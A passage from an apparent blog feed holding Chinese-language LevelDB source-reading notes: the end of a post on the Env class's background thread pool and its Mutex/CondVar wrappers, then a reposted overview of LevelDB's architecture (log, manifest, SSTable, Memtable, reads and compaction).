class="function"><span class="params">    <span class="keyword">void</span> (*background_work_function)(<span class="keyword">void</span>* background_work_arg),</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">void</span>* background_work_arg)</span> </span>&#123;</span><br><span class="line">  background_work_mutex_.Lock();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Start the background thread, if we haven't done so already.</span></span><br><span class="line">  <span class="keyword">if</span> (!started_background_thread_) &#123;<span class="comment">// 首次执行，开启线程</span></span><br><span class="line">    started_background_thread_ = <span class="literal">true</span>;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::thread <span class="title">background_thread</span><span class="params">(PosixEnv::BackgroundThreadEntryPoint, <span class="keyword">this</span>)</span></span>;</span><br><span class="line">    background_thread.<span class="built_in">detach</span>();<span class="comment">// detach模式，由内核去回收</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If the queue is empty, the background thread may be waiting for work.</span></span><br><span class="line">  <span class="keyword">if</span> (background_work_queue_.empty()) &#123;</span><br><span class="line">    background_work_cv_.Signal();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  background_work_queue_.emplace(background_work_function, background_work_arg);</span><br><span class="line">  background_work_mutex_.Unlock();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里重点看下唤醒消费者的代码，注意这里Signal后，消费者的线程虽然被唤醒，但是依然处于阻塞状态，只有当前线程，调用 </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background_work_mutex_.Unlock();</span><br></pre></td></tr></table></figure><p>后，消费者线程才能正常执行。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// If the queue is empty, the background thread may be waiting for work.</span></span><br><span class="line"><span class="keyword">if</span> (background_work_queue_.empty()) &#123;</span><br><span class="line">background_work_cv_.Signal();</span><br><span class="line">&#125;</span><br><span class="line">background_work_queue_.emplace(background_work_function, background_work_arg);<span class="comment">// 插入一个任务</span></span><br><span class="line">background_work_mutex_.Unlock();</span><br></pre></td></tr></table></figure><p>所以只有当真正插入一个任务后，线程才正式执行。</p><p>如果第一次调度，则首先启动线程, 线程执行的函数为<code>BackgroundThreadEntryPoint:</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">BackgroundThreadEntryPoint</span><span class="params">(PosixEnv* env)</span> </span>&#123;</span><br><span class="line">    env-&gt;BackgroundThreadMain();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">PosixEnv::BackgroundThreadMain</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    background_work_mutex_.Lock();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Wait until there is work to be done.</span></span><br><span class="line">    <span class="keyword">while</span> (background_work_queue_.empty()) &#123;</span><br><span class="line">      background_work_cv_.Wait();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 取出任务</span></span><br><span class="line">    assert(!background_work_queue_.empty());</span><br><span class="line">    <span class="keyword">auto</span> background_work_function = background_work_queue_.front().function;</span><br><span class="line">    <span class="keyword">void</span>* background_work_arg = background_work_queue_.front().arg;</span><br><span class="line">    background_work_queue_.pop();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 执行</span></span><br><span class="line">    background_work_mutex_.Unlock();</span><br><span class="line">    background_work_function(background_work_arg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="互斥量Mutex和条件变量CondVar"><a href="#互斥量Mutex和条件变量CondVar" class="headerlink" title="互斥量Mutex和条件变量CondVar"></a>互斥量Mutex和条件变量CondVar</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LOCKABLE</span> <span class="title">Mutex</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  Mutex() = <span class="keyword">default</span>;</span><br><span class="line">  ~Mutex() = <span class="keyword">default</span>;</span><br><span class="line"></span><br><span class="line">  Mutex(<span class="keyword">const</span> Mutex&amp;) = <span class="keyword">delete</span>;</span><br><span class="line">  Mutex&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> Mutex&amp;) = <span class="keyword">delete</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Lock</span><span class="params">()</span> <span class="title">EXCLUSIVE_LOCK_FUNCTION</span><span class="params">()</span> </span>&#123; mu_.lock(); &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Unlock</span><span class="params">()</span> <span class="title">UNLOCK_FUNCTION</span><span class="params">()</span> </span>&#123; mu_.unlock(); &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">AssertHeld</span><span class="params">()</span> <span class="title">ASSERT_EXCLUSIVE_LOCK</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">CondVar</span>;</span></span><br><span class="line">  <span class="built_in">std</span>::mutex mu_;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Mutex就是对标准mutex的封装，同时用了些宏来修饰，这些宏是clang用于 语法分析（猜想） 的宏，如这里的 ASSERT_EXCLUSIVE_LOCK， 表示调用AssertHeld函数时，表示必须是在获取独占lock的情况下，才能执行之后的代码。比如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Status <span class="title">DBImpl::Recover</span><span class="params">(VersionEdit* edit, <span class="keyword">bool</span>* save_manifest)</span> </span>&#123;</span><br><span class="line">  mutex_.AssertHeld();</span><br></pre></td></tr></table></figure><p>DBImpl::Recover函数的第一行代码就是表示该函数必须在本线程获取独占锁的情况下执行。</p><p>下面再看看条件变量，CondVar：</p><p>条件变量只是对std::condition_variable的浅封装：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Thinly wraps std::condition_variable.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CondVar</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">CondVar</span><span class="params">(Mutex* mu)</span> : <span class="title">mu_</span><span class="params">(mu)</span> </span>&#123; assert(mu != <span class="literal">nullptr</span>); &#125;</span><br><span class="line">  ~CondVar() = <span class="keyword">default</span>;</span><br><span class="line"></span><br><span class="line">  CondVar(<span class="keyword">const</span> CondVar&amp;) = <span class="keyword">delete</span>;</span><br><span class="line">  CondVar&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> CondVar&amp;) = <span class="keyword">delete</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Wait</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::unique_lock&lt;<span class="built_in">std</span>::mutex&gt; <span class="title">lock</span><span class="params">(mu_-&gt;mu_, <span class="built_in">std</span>::adopt_lock)</span></span>;</span><br><span class="line">    cv_.wait(lock);</span><br><span class="line">    lock.<span class="built_in">release</span>();<span class="comment">// 断开lock和mutex的关联，不释放mutex</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Signal</span><span class="params">()</span> </span>&#123; cv_.notify_one(); &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">SignalAll</span><span class="params">()</span> </span>&#123; cv_.notify_all(); &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="built_in">std</span>::condition_variable cv_;</span><br><span class="line">  Mutex* <span class="keyword">const</span> mu_;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文解释了leveldb中Env类的作用，并分析了内部线程池的实现，下文我们将说一下leveldb内的编码。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本系列的前几篇文章并不准备深入到leveldb中的”核心“，而是分析一些leveldb中用到的”杂项“内容，如本文要说的Env类，后面要提到的编码、文件命名方式等。&lt;/p&gt;
    
    </summary>
    
    
      <category term="leveldb" scheme="https://www.ravenxrz.ink/categories/leveldb/"/>
    
    
  </entry>
  
  <entry>
    <title>leveldb源码阅读记录-整体架构</title>
    <link href="https://www.ravenxrz.ink/archives/1a545f48.html"/>
    <id>https://www.ravenxrz.ink/archives/1a545f48.html</id>
    <published>2020-10-12T01:00:06.000Z</published>
    <updated>2020-10-12T02:36:35.418Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>本系列文章是对leveldb源码分析的笔记，基本会包含leveldb中的方方面面。阅读过程中，参照网上各博客并加上了个人的理解，所以难免有错，如有错误还请告知。</p><p>如果你是刚开始看leveldb，我希望你对LSM有一定的概念。为了避免过度陷入代码细节，本文将解释leveldb的整体设计架构，各个组件的宏观设计，这样能在心里对leveldb有个轮廓，也能指导我们从哪里入手代码。</p><p>本文非写者编辑，转载自：<span class="exturl" data-url="aHR0cDovL2NpZ2hhby5jb20vMjAxNi8wOC8xNC9sZXZlbGRiLXNvdXJjZS1hbmFseXNpcy0wMi1zdHJ1Y3R1cmUv" title="http://cighao.com/2016/08/14/leveldb-source-analysis-02-structure/">http://cighao.com/2016/08/14/leveldb-source-analysis-02-structure/<i class="fa fa-external-link"></i></span></p><a id="more"></a><h2 id="1-整体架构"><a href="#1-整体架构" class="headerlink" title="1. 整体架构"></a>1. 整体架构</h2><p>LevelDB 作为存储系统，数据记录的存储介质包括内存以及磁盘文件，当 LevelDB 运行了一段时间，此时我们给 LevelDB 进行透视拍照，会看到如下一番景象，这也就是 LevelDB 的结构图。</p><p><img data-src="http://cighao.com/img/articles/leveldb/leveldb-02-01.png" alt="LevelDB结构"></p><p>从图中可以看出，构成 LevelDB 静态结构的包括六个主要部分：内存中的 <strong>MemTable</strong> 和 <strong>Immutable MemTable</strong> 以及磁盘上的几种主要文件：<strong>Current文件</strong>，<strong>Manifest文件</strong>，<strong>log文件</strong>以及 <strong>SSTable 文件</strong>。当然，LevelDB 除了这六个主要部分还有一些辅助的文件，但是以上六个文件和数据结构是 LevelDB 的主体构成元素。</p><p>当应用写入一条Key:Value记录的时候，LevelDb会先往log文件里写入，成功后将记录插进Memtable中，这样基本就算完成了写入操作，因为一次写入操作只涉及一次磁盘顺序写和一次内存写入，所以这是为何说LevelDb写入速度极快的主要原因。</p><p>SSTable 就是由内存中的数据不断导出并进行 Compaction 操作后形成的，而且 SSTable 的所有文件是一种层级结构，第一层为Level 0，第二层为Level 1，依次类推，层级逐渐增高。</p><p>SSTable 中的文件(后缀为.sst)是 key 有序的，就是说在文件中小 key 记录排在大 key 记录之前，除了 level 0，各个 level 的 SSTable 都是如此。</p><h2 id="2-manifest文件"><a href="#2-manifest文件" class="headerlink" title="2. manifest文件"></a>2. manifest文件</h2><p>SSTable 中的某个文件属于特定层级，而且其存储的记录是 key 有序的，那么必然有文件中的最小 key 和最大 key，这是非常重要的信息，LevelDB 应该记下这些信息。<strong>manifest</strong> 就是干这个的，它记载了 SSTable 各个文件的管理信息，比如属于哪个 level，文件名称叫啥，最小 key 和最大 key 各自是多少。下图是 manifest 所存储内容的示意：</p><p><img data-src="http://cighao.com/img/articles/leveldb/leveldb-02-02.png" alt="Manifest存储示意图"></p><p>图中只显示了两个文件（manifest 会记载所有 SSTable 文件的这些信息），即 level 0 的 Test1.sst 和 Test2.sst 文件，同时记载了这些文件各自对应的 key 范围，比如 Test1.sst 的 key 范围是 “abc” 到 “hello”，而文件 Test2.sst 的 key 范围是 “bbc” 到 “world”，可以看出两者的 key 范围是有重叠的。</p><h2 id="3-current-文件"><a href="#3-current-文件" class="headerlink" title="3. current 文件"></a>3. current 文件</h2><p>这个文件的内容只有一个信息，就是记载当前的 manifest 文件名。因为在 LevleDB 的运行过程中，随着 compaction 的进行，SSTable 文件会发生变化，会有新的文件产生，老的文件被废弃，manifest 也会跟着反映这种变化，此时往往会新生成 manifest 文件来记载这种变化，而 current 则用来指出哪个 manifest 文件才是我们关心的那个 manifest文件。</p><h2 id="4-log-文件"><a href="#4-log-文件" class="headerlink" title="4. log 文件"></a>4. log 文件</h2><p>log 文件在 LevelDB 中的主要作用是系统故障恢复时，能够保证不会丢失数据。因为在将记录写入内存的 memtable 之前，会先写入 log 文件，这样即使系统发生故障，memtable 中的数据没有来得及 dump 到磁盘的 SSTable 文件，LevelDB 也可以根据 log 文件恢复内存的 Memtable 数据结构内容，不会造成系统丢失数据。</p><p>LevelDB 对于一个 log 文件，会把它切割成以 32K 为单位的物理 Block，每次读取以一个 Block 作为基本读取单位，下图展示的 log 文件由3个 Block 构成，所以从物理布局来讲，一个 log 文件就是由连续的 32K 大小 Block 构成的。</p><p><img data-src="http://cighao.com/img/articles/leveldb/leveldb-02-03.png" alt="log文件布局"></p><p>log 文件中的数据是以 block 为单位组织，写日志时，处于一致性考虑并没有按 block 单位写，每次更新均对 log 文件进行 IO，每次更新写入作为一个 record，每条 record 的结构如下图所示：</p><p><img data-src="http://cighao.com/img/articles/leveldb/leveldb-02-04.png" alt="记录结构"></p><p><code>checksum</code> 记录的是 “type” 和 “data” 字段的CRC校验，为了避免处理不完整或者是被破坏的数据，当 LevelDB 读取记录数据时候会对数据进行校验，如果发现和存储的 checksum 相同，说明数据完整无破坏，可以继续后续流程。</p><p><code>length</code> 记录的是 record 内保存的 data 长度(小端对齐)。</p><p><code>data</code> 记录的是 Key:Value 数值对.</p><p><code>type</code> 字段则指出了每条记录的逻辑结构和 log 文件物理分块结构之间的关系，具体而言，主要有以下四种类型：<code>FULL</code>, <code>FIRST</code>, <code>MIDDLE</code>, <code>LAST</code>。如果记录类型是FULL，代表了当前记录内容完整地存储在一个物理Block里，没有被不同的物理Block切割开；如果记录被相邻的物理Block切割开，则类型会是其他三种类型中的一种。我们以图3.1所示的例子来具体说明。</p><p>假设目前存在三条记录，Record A，Record B 和 Record C，其中 Record A 大小为10K，Record B 大小为80K，Record C大小为12K，那么其在 log 文件中的逻辑布局会如上面的图所示。Record A是图中蓝色区域所示，因为大小为10K&lt;32K，能够放在一个物理Block中，所以其类型为FULL；Record B 大小为80K，而Block 1因为放入了Record A，所以还剩下22K，不足以放下Record B，所以在Block 1的剩余部分放入Record B的开头一部分，类型标识为FIRST，代表了是一个记录的起始部分；Record B还有58K没有存储，这些只能依次放在后续的物理Block里面，因为Block 2大小只有32K，仍然放不下Record B的剩余部分，所以Block 2全部用来放Record B，且标识类型为MIDDLE，意思是这是Record B中间一段数据；Record B剩下的部分可以完全放在Block 3中，类型标识为LAST，代表了这是Record B的末尾数据；图中黄色的Record C因为大小为12K，Block 3剩下的空间足以全部放下它，所以其类型标识为FULL。</p><p>从这个小例子可以看出逻辑记录和物理Block之间的关系，LevelDB一次物理读取为一个Block，然后根据类型情况拼接出逻辑记录，供后续流程处理。</p><h2 id="5-SSTable-文件"><a href="#5-SSTable-文件" class="headerlink" title="5. SSTable 文件"></a>5. SSTable 文件</h2><p>LevelDB 不同层级有很多 SSTable 文件（以后缀.sst为特征），所有 .sst 文件内部布局都是一样的。上节介绍 log 文件是物理分块的，SSTable也一样会将文件划分为固定大小的物理存储块，但是两者逻辑布局大不相同，根本原因是：log文件中的记录是 Key 无序的，即先后记录的 key 大小没有明确大小关系，而 .sst 文件内部则是根据记录的 Key 由小到大排列的。</p><p><img data-src="http://cighao.com/img/articles/leveldb/leveldb-02-05.png" alt=".sst文件的分块结构"></p><p>上图展示了一个 .sst 文件的物理划分结构，同 log 文件一样，也是划分为固定大小的存储块，每个 Block 分为三个部分：<strong>数据存储区</strong>，<strong>Type 区</strong>用于标识数据存储区是否采用了数据压缩算法（Snappy压缩或者无压缩），<strong>CRC校验</strong>则是数据校验码，用于判别数据在生成和传输中是否出错。</p><p>以上是.sst的物理布局，下面介绍.sst文件的逻辑布局，所谓逻辑布局，就是说尽管大家都是物理块，但是每一块存储什么内容，内部又有什么结构等。下图展示了.sst文件的内部逻辑解释。</p><p><img data-src="http://cighao.com/img/articles/leveldb/leveldb-02-06.png" alt="逻辑布局"></p><p>从上图可以看出，从大的方面，可以将 .sst文 件划分为<strong>数据存储区</strong>和<strong>数据管理区</strong>，数据存储区存放实际的 key-value 数据，数据管理区则提供一些索引指针等管理数据，目的是更快速便捷的查找相应的记录。两个区域都是在上述的分块基础上的，就是说文件的前面若干块实际存储 KV 数据，后面数据管理区存储管理数据。管理数据又分为四种不同类型：<strong>Meta Block</strong>，<strong>MetaBlock 索引</strong>和<strong>数据索引块</strong>以及一个<strong>文件尾部块</strong>。</p><p><code>data_block</code>：实际存储的 KV 数据。<br><code>meta_block</code>：每个 data_block 对应一个 meta_block，保存 data_block 中的 key size/value size/kv counts 之类的统计信息，当前版本未实现。<br><code>metaindex_block</code>：保存 meta_block 的索引信息，当前版本未实现。<br><code>index_block</code>：保存每个 data_block 的 last_key 及其在 SSTable 文件中的索引。block 中 entry 的 key 即是 last_key(依赖于FindShortestSeparator()/FindShortSuccessor()的实现)，value即是该data_block的BlockHandler（offset/size）。<br><code>footer</code>：文件末尾固定长度的数据。保存着 metaindex_block 和 index_block 的索引信息(BlockHandler)，为达到固定的长度，添加 padding_bytes。最后有8个字节的 magic 校验。</p><p>footer 的结构如下图所示：</p><p><img data-src="http://cighao.com/img/articles/leveldb/leveldb-02-07.png" alt="Footer"></p><p><code>metaindex_block_handle</code> 指出了 metaindex block 的起始位置和大小；<code>index_block_handle</code> 指出了 index Block 的起始地址和大小；这两个字段可以理解为索引的索引，是为了正确读出索引值而设立的；为达到固定的长度，添加 <code>padding_bytes</code>。最后有8个字节的 <code>magic</code> 校验。</p><p>下图是数据索引块的内部结构示意图：</p><p><img data-src="http://cighao.com/img/articles/leveldb/leveldb-02-08.png" alt="数据索引"></p><p>Data Block 内的 KV 记录是按照 key 由小到大排列的，数据索引区的每条记录是对某个 Data Block 建立的索引信息，每条索引信息包含三个内容。以上图所示的数据块 i 的索引 index i 来说：</p><p><strong>第一个字段</strong>：记录大于等于数据块i中最大的 key 值的那个 key。在索引里保存的这个 key 值未必一定是某条记录的 key，以上的例子来说，假设数据块i的最小key=“samecity”，最大key=“the best”；数据块i+1的最小key=“the fox”，最大key=“zoo”，那么对于数据块i的索引 index i 来说，其第一个字段记载大于等于数据块i的最大Key(“the best”) 同时要小于数据块i+1的最小Key(“the fox”)，所以例子中 index i 的第一个字段是 “the c”，这个是满足要求的；而 index i+1 的第一个字段则是 “zoo”，即数据块i+1的最大 key。</p><p><strong>第二个字段</strong>：指出数据块 i 在 .sst 文件中的起始位置。</p><p><strong>第三个字段</strong>：指出 Data Block i 的大小（有时候是有数据压缩的）。</p><p>上面主要介绍的是数据管理区的内部结构，下图是数据区的一个 Block 的数据部分布局。</p><p><img data-src="http://cighao.com/img/articles/leveldb/leveldb-02-09.png" alt=""></p><p>从图中可以看出，其内部也分为两个部分，前面是一个个 KV 记录，其顺序是根据 key 值由小到大排列的，在Block尾部则是一些“重启点”（Restart Point），其实是一些指针，指出 Block 内容中的一些记录位置。</p><p>“重启点”是干什么的呢？Block内容里的KV记录是按照 key 大小有序的，这样的话，相邻的两条记录很可能 key 部分存在重叠，比如 key i=“the Car”，Key i+1=“the color”，那么两者存在重叠部分 “the c”，为了减少 key 的存储量，Key i+1 可以只存储和上一条 key 不同的部分 “olor”，两者的共同部分从 key i 中可以获得。记录的 key 在 Block 内容部分就是这么存储的，主要目的是减少存储开销。“重启点”的意思是：在这条记录开始，不再采取只记载不同的 key 部分，而是重新记录所有的 key 值，假设 key i+1 是一个重启点，那么 key 里面会完整存储 “the color”，而不是采用简略的“olor”方式。Block尾部就是指出哪些记录是这些重启点的。</p><p>其中记录的格式如下所示：</p><p><img data-src="http://cighao.com/img/articles/leveldb/leveldb-02-10.png" alt="记录格式"></p><p>每个记录包含5个字段：</p><p><strong>key共享长度</strong>：比如上面的 “olor” 记录， 其 key 和上一条记录共享的 key 部分长度是 “the c” 的长度，即5；</p><p><strong>key非共享长度</strong>：对于“olor”来说，是4；</p><p><strong>value长度</strong>：指出 key-value 中 value 的长度，在后面的 value 内容字段中存储实际的 value 值；</p><p><strong>key非共享内容</strong>：指实际存储 “olor” 这个 key 字符串；</p><p><strong>value内容</strong>：存储实际的 value 值。</p><h2 id="6-Memtable"><a href="#6-Memtable" class="headerlink" title="6. Memtable"></a>6. Memtable</h2><p>所有 KV 数据都是存储在 Memtable，Immutable Memtable 和 SSTable 中的，Immutable Memtable从结构上讲和 Memtable 是完全一样的，区别仅仅在于其是只读的，不允许写入操作，而 Memtable 则是允许写入和读取的。当 Memtable 写入的数据占用内存到达指定数量，则自动转换为 Immutable Memtable，等待 Dump 到磁盘中，系统会自动生成新的 Memtable 供写操作写入新数据，理解了 Memtable，那么 Immutable Memtable 自然不在话下。</p><p>LevelDB 的 MemTable 提供了将 KV 数据写入，删除以及读取 KV 记录的操作接口，但是事实上 Memtable 并不存在真正的删除操作,删除某个Key的Value在 Memtable 内是作为插入一条记录实施的，但是会打上一个 Key 的删除标记，真正的删除操作是Lazy的，会在以后的 Compaction 过程中去掉这个KV。</p><p>需要注意的是，LevelDB 的 Memtable 中KV对是根据key大小有序存储的，在系统插入新的KV时，LevelDB 要把这个KV插到合适的位置上以保持这种 Key 有序性。其实，LevelDB 的 Memtable 类只是一个接口类，真正的操作是通过背后的 SkipList 来做的，包括插入操作和读取操作等，所以 Memtable 的核心数据结构是一个 SkipList。</p><p>SkipList是由 William Pugh 发明。他在 Communications of the ACM June 1990, 33(6) 668-676 发表了 Skip lists: a probabilistic alternative to balanced trees，在该论文中详细解释了SkipList的数据结构和插入删除操作。关于SkipList的详细介绍可以参考这篇文章：<span class="exturl" data-url="aHR0cDovL3d3dy5jbmJsb2dzLmNvbS94dXFpYW5nL2FyY2hpdmUvMjAxMS8wNS8yMi8yMDUzNTE2Lmh0bWzjgII=" title="http://www.cnblogs.com/xuqiang/archive/2011/05/22/2053516.html。">http://www.cnblogs.com/xuqiang/archive/2011/05/22/2053516.html。<i class="fa fa-external-link"></i></span></p><h2 id="7-读记录"><a href="#7-读记录" class="headerlink" title="7. 读记录"></a>7. 读记录</h2><p>因为写入操作比较简单就不介绍了，LevelDB 的读取流程如下所示：</p><p><img data-src="http://cighao.com/img/articles/leveldb/leveldb-02-11.png" alt="LevelDB读取记录流程"></p><p>LevelDB 首先会去查看内存中的 Memtable，如果 Memtable 中包含 key 及其对应的value，则返回 value 值即可；</p><p>如果在 Memtable 没有读到key，则接下来到同样处于内存中的 Immutable Memtable 中去读取，类似地，如果读到就返回，若是没有读到,那么只能万般无奈下从磁盘中的大量SSTable文件中查找。</p><p>因为SSTable数量较多，而且分成多个level，所以在SSTable中读数据是相当蜿蜒曲折的一段旅程。总的读取原则是这样的：首先从属于 level 0 的文件中查找，如果找到则返回对应的value值，如果没有找到那么到 level 1 中的文件中去找，如此循环往复，直到在某层 SSTable 文件中找到这个 key 对应的 value 为止（或者查到最高level，查找失败，说明整个系统中不存在这个Key)。</p><p>如果给定一个要查询的 key 和某个 key range 包含这个key的 SSTable 文件，那么 LevelDB 是如何进行具体查找过程的呢？LevelDB 一般会先在内存中的Cache中查找是否包含这个文件的缓存记录，如果包含，则从缓存中读取；如果不包含，则打开SSTable文件，同时将这个文件的索引部分加载到内存中并放入Cache中。 这样Cache里面就有了这个SSTable的缓存项，但是只有索引部分在内存中，之后 LevelDB 根据索引可以定位到哪个内容Block会包含这条key，从文件中读出这个Block的内容，在根据记录一一比较，如果找到则返回结果，如果没有找到，那么说明这个level的 SSTable 文件并不包含这个key，所以到下一级别的 SSTable 中去查找。</p><h2 id="8-Compaction"><a href="#8-Compaction" class="headerlink" title="8. Compaction"></a>8. Compaction</h2><p>LevelDB 包含其中两种 compaction 模式：minor 和 major。所谓 <strong>minor Compaction</strong>，就是把 memtable 中的数据导出到 SSTable 文件中；<strong>major compaction</strong> 就是合并不同层级的 SSTable 文件。</p><p><strong>minor Compaction</strong></p><p>Minor compaction 的目的是当内存中的 memtable 大小到了一定值时，将内容保存到磁盘文件中。其机理如下图所示：</p><p><img data-src="http://cighao.com/img/articles/leveldb/leveldb-02-12.png" alt="Minor compaction"></p><p>当 memtable 数量到了一定程度会转换为 immutable memtable，此时不能往其中写入记录，只能从中读取KV内容。之前介绍过，immutable memtable 其实是一个多层级队列SkipList，其中的记录是根据 key 有序排列的。所以这个 minor compaction 实现起来也很简单，就是按照 immutable memtable 中记录由小到大遍历，并依次写入一个 level 0 的新建 SSTable 文件中，写完后建立文件的 index 数据，这样就完成了一次minor compaction。</p><p>从上图中也可以看出，对于被删除的记录，在 minor compaction 过程中并不真正删除这个记录，原因也很简单，这里只知道要删掉 key 记录，但是这个 KV 数据在哪里？那需要复杂的查找，所以在 minor compaction 的时候并不做删除，只是将这个 key 作为一个记录写入文件中，至于真正的删除操作，在以后更高层级的 compaction 中会去做。</p><p><strong>major compaction</strong></p><p>当某个 level 下的 SSTable 文件数目超过一定设置值后，levelDB 会从这个 level 的 SSTable 中选择一个文件（level&gt;0），将其和高一层级的 level+1 的 SSTable 文件合并，这就是 major compaction。</p><p>在大于 0 的层级中，每个 SSTable 文件内的key都是由小到大有序存储的，而且不同文件之间的key范围（文件内最小key和最大key之间）不会有任何重叠。level 0 的 SSTable 文件有些特殊，尽管每个文件也是根据Key由小到大排列，但是因为 level 0 的文件是通过 minor compaction 直接生成的，所以任意两个 level 0下的两个 SSTable 文件可能再key范围上有重叠。所以在做 major compaction 的时候，对于大于 level 0 的层级，选择其中一个文件就行，但是对于 level 0 来说，指定某个文件后，本 level 中很可能有其他 SSTable 文件的 key 范围和这个文件有重叠，这种情况下，要找出所有有重叠的文件和 level 1 的文件进行合并，即 level 0 在进行文件选择的时候，可能会有多个文件参与 major compaction。</p><p>LevelDB 在选定某个 level 进行 compaction 后，还要选择是具体哪个文件要进行 compaction，LevelDB 在这里有个小技巧， 就是说轮流来，比如这次是文件A进行 compaction，那么下次就是在 key range 上紧挨着文件A的文件B进行 compaction，这样每个文件都会有机会轮流和高层的 level 文件进行合并。</p><p>如果选好了 level i 的文件A和 level i+1 层的文件进行合并，那么问题又来了，应该选择 level i+1 哪些文件进行合并？LevelDB 选择 i+1 层中和文件A在 key range 上有重叠的所有文件来和文件A进行合并。</p><p>也就是说，选定了 level i 的文件A，之后在 level i+1 中找到了所有需要合并的文件B,C,D… 等等。剩下的问题就是具体是如何进行 major 合并的？就是说给定了一系列文件，每个文件内部是key有序的，如何对这些文件进行合并，使得新生成的文件仍然Key有序，同时抛掉哪些不再有价值的 KV 数据。</p><p>下图所示的是合并过程：</p><p><img data-src="http://cighao.com/img/articles/leveldb/leveldb-02-13.png" alt="SSTable compaction"></p><p>major compaction 的过程如下：对多个文件采用多路归并排序的方式，依次找出其中最小的key记录，也就是对多个文件中的所有记录重新进行排序。之后采取一定的标准判断这个key是否还需要保存，如果判断没有保存价值，那么直接抛掉，如果觉得还需要继续保存，那么就将其写入 level i+1 层中新生成的一个 SSTable 文件中。就这样对KV数据一一处理，形成了一系列新的 i+1 层数据文件，之前的 i 层文件和 i+1 层参与 compaction 的文件数据此时已经没有意义了，所以全部删除。这样就完成了 i 层和 i+1 层文件记录的合并过程。</p><p>那么在 major compaction 过程中，判断一个KV记录是否抛弃的标准是什么呢？其中一个标准是:对于某个key来说，如果在小于 i 层中存在这个key，那么这个KV在major compaction 过程中可以抛掉。因为，对于层级低于 i 的文件中如果存在同一 key 的记录，那么说明对于 key 来说，有更新鲜的 value 存在，那么过去的 value 就等于没有意义了，所以可以删除。</p><h2 id="9-Cache"><a href="#9-Cache" class="headerlink" title="9. 